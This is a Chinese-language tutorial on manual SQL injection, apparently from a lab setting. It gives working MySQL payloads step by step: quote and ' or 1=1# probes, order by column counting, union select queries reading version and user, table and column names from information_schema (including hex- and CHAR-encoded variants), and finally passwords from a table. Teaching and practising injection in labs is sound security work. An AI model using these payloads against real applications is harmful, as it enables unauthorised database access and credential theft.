#SQL手工注入基础
```
Author:C0d3r1iu 有什么疑惑可以随时联系我
mail:admin@recorday.cn
```
***


#标准手工注入流程
###1.探测注入点
####1.测试注入点是否存在

常用方法：

1.单引号探测

![](http://hitnslab.com:65503/media/upload/SQL1.png)


2.逻辑语句判断
这里分析语句可知，用单引号闭合前一个引号，后面执行我们的or语句

payload:`' or 1=1# `

这样就把所有信息显示出来了

![](http://hitnslab.com:65503/media/upload/SQL2.png)

如果是信息显示类注入点，还可以用and 1=1 和and 1=2 ，前者返回成功，后者返回失败来进行判断，这里不再赘述。

###2.探测注入点之后，收集信息

####1.union select 联合查询

在联合查询前，需要判断能显示字段的数量，用到order by 语句
这里作为演示，猜字段数的区间小一点，尽可能用二分法，凭感觉也可以
![](http://hitnslab.com:65503/media/upload/SQL3_aLS41LU.png)

![](http://hitnslab.com:65503/media/upload/SQL4_ge34s6s.png)
之后又试了 orderby3不报错，4报错
因此是3个字段

我们构造如下语句：
`' union select 1,2,3 #`

再次注入查看效果即可

![](http://hitnslab.com:65503/media/upload/SQL5.png)

那我们替换成
`' union select version(),now(),user()#`
之后呢？

![](http://hitnslab.com:65503/media/upload/SQL6.png)

没错，这样就可以查询，搜集信息
version()版本信息
database()数据库名
user()获取当前用户
@@ version_compile_os 操作系统信息

####2.查询information_schema

如果mysql版本大于5.0，可以对默认表进行读取进行更多信息的探索:
payload如下：
`'union select 1,table_name from  information_schema.tables #`

![](http://hitnslab.com:65503/media/upload/SQL7.png)

在爆出的众多表名中寻找需要利用的即可

![](http://hitnslab.com:65503/media/upload/SQL8.png)

或者爆指定数据库的表（hex转码）：

![](http://hitnslab.com:65503/media/upload/SQL9.png)
payload1如下：

`' union select 1,2,table_name from information_schema.tables where table_schema='inject`

payload2如下：
`' union select 1,2,table_name from information_schema.tables where table_schema=0x696E6A656374 #`

同理payload2如下：
`' union select 1,2,table_name from information_schema.tables where table_schema=CHAR(105,110,106,101,99,116)#';`

####3.读完表名读字段

把上一步的table换成column就可以了

payload：

`' union select 1,2,column_name from information_schema.columns where table_name='dbinfo`

####4.读取表内部具体内容

这里注意要带上库的名字，看程序具体怎么写

payload:

`' union select 1,2,password from inject.dbinfo#`

到了这里，一次完整的注入基本就完成了


